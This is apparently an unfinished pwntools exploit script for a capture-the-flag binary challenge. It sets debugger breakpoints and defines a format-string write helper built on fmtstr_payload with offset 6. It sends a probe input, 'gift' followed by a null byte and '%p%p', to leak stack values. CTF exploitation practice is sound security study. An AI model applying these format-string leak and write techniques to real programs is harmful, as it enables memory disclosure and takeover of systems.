#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("chall_patched")

gs = '''
b *Christmas+376
b *Christmas+362
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("address", 12345)
    else:
        return process(elf.path)

# Plan:

# Addresses
offset = 6


# Functions
# size is: byte, short or int
def payload(offset, where, what, size):
    return fmtstr_payload(offset, {where:what}, write_size=size)


io = start()

io.sendlineafter(b"(gift/flag)", b"gift\x00%p%p")

io.interactive()
